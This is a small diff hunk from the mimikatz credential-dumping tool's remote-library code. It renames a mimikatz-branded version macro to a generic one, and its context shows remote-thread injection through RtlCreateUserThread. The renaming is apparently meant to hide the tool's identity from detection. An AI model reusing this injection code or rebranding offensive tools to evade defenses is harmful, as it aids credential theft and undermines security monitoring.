@@ -53,7 +53,7 @@ BOOL kull_m_remotelib_create(PKULL_M_MEMORY_ADDRESS aRemoteFunc, PREMOTE_LIB_INP
 				switch(aRemoteFunc->hMemory->type)
 				{
 				case KULL_M_MEMORY_TYPE_PROCESS:
-					if(MIMIKATZ_NT_MAJOR_VERSION > 5)
+					if(TOOLS_NT_MAJOR_VERSION > 5)
 					{
 						status = RtlCreateUserThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, &hThread, NULL);
 						if(!NT_SUCCESS(status))
